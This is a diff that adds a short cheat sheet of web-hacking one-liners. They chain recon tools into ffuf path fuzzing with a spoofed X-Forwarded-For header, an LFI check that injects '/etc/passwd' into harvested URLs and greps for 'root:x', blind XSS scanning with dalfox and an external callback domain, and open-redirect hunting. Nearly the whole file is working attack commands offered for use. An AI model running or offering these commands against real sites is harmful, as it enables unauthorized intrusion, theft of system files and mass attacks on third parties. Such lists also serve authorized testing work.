@@ -1,0 +1,11 @@
+FFUF fuzzing paths + Domains
+assetfinder http://DOMAIN.COM | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist_paths -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
+
+LFI testing
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+XSS testing + blinding XSS
+cat domains | waybackurls| egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b xss_hunter.ht -o xss_results
+
+Open Redirect
+cat domains | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
